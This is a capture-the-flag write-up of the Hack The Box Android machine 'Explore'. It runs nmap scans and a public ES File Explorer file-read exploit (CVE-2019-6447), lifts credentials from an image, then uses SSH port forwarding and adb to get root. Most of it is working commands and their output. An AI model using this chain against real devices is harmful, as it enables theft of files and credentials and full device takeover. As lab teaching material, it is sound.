---
title: "HTB explore writeup"
date: 2021-09-15T11:30:03+00:00
weight: 1
---

We start with a nmap scan

all ports nmap (cut):
```bash
$ nmap -p- 10.10.10.247                     
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
35391/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown
```

---

nmap with scripts on the open ports (cut): 

```bash
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
35391/tcp open     unknown
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
```

None of the ports's can be visited from the web, except the port `59777` but that leads to a page that says forbidden. According to the nmap results, there probably is a minecraft server behind that port, so nothing too intresting there.

The only lead we have is port 42135, let's look further into it. 

---

Running searchsploit we get multiple hits, the first one that comes up seems to be the best for us, since the rest don't have the correct name. `ES File Explorer 4.1.9.7.4 - Arbitrary File Read `

---

```bash
$ searchsploit -m android/remote/50070.py
```


Looking at the code we can see a proxy rule, `proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}`
The proxy variable is already set to the burpsuit proxy listener's port. We just need to add the proxy argument to the `requests.post` in the `httPost()` function. We can do that by adding `proxies=proxy` to the command so we get the following line:
```python
response = requests.post(url, headers=header, data=data, proxies=proxy)
```

We can run the program with the following arguments: `python3 50070.py listFiles 10.10.10.247`. We can look at our captured burp request to see what happened. 


```http
POST / HTTP/1.1
Host: 10.10.10.247:59777
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 24

{"command": "listFiles"}
```

The exploit script is making a POST request to the ES File Explorer service with a command. We specified the listFiles command previously. 
When forwarding the request we get a list of files, which seem to be on an android system. 

While trying out a few commands from the exploit script, I stumble upon the command `listPics`. This command lists all the pics found by the ES file explorer. We see one intresting file named `creds.jpg`. We can retrieve this file by selecting the getFile command:
```bash
python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
```

we move the `out.dat` file to creds.jpg by executing the `mv out.dat creds.jpg` command. When opening the image we see credentials for the account kristi. 
`kristi:Kr1sT!5h@Rp3xPl0r3!`
We try the credentials on ssh, port 2222

```bash
ssh -p 2222 kristi@10.10.10.247                                                                                                                                                                                                    127 ⨯
Password authentication
Password: 
:/ $ 
```
The credentials are correct and we get a shell.

---

After some googling on this file system I found this: https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/adb-commands#port-tunneling

netstat exists on ADB (which is in what we are right now, an android debugging tool of some sort). 

```bash
netstat -tuln                                                         
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       0      0 :::42135                :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:35209 :::*                    LISTEN     
tcp6       0      0 ::ffff:127.0.0.1:44971  :::*                    LISTEN     
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN     
tcp6       0     80 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:60104 ESTABLISHED
tcp6       0      0 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:60102 ESTABLISHED
udp        0      0 10.10.10.247:21625      1.0.0.1:53              ESTABLISHED
udp        0      0 0.0.0.0:5353            0.0.0.0:*                          
udp        0      0 10.10.10.247:27908      1.1.1.1:53              ESTABLISHED
udp        0      0 0.0.0.0:33083           0.0.0.0:*                          
udp6       0      0 ::ffff:10.10.10.2:43574 :::*                               
udp6       0      0 :::1900                 :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 :::5353                 :::*                               
udp6       0      0 :::49675                :::*
```

We see that port 5555 is listening and that we couldn't find in the nmap scan. Let's try to connect to that port.
Since we can't access it from outside the box, let's go trough the inside and port forward it. 

```bash
ssh -p 2222 kristi@10.10.10.247 -L 5555:127.0.0.1:5555
Password authentication
Password: 
:/ $
```
It appears that we just connected to the shell, we have in a matter of fact. But we've also port forwarded the port 5555 on the box to port 5555 on our local machine. 
We can now connect to the port using adb connect localhost:5555
We connect first: `adb connect 127.0.0.1:5555`
Then we spawn a shell: `adb -s 127.0.0.1:5555 shell`
After connecting, we can run the command `su` to get root privileges.
```bash
x86_64:/ $ su
:/ # whoami
root
```

---

The user flag is located in `/mnt/user/0/primary`
The root flag is located in: `/data/root.txt`

That was all! Quite an easy box, but still a challenge researching about the ADB. Thanks for reading!

- Crunch#8996
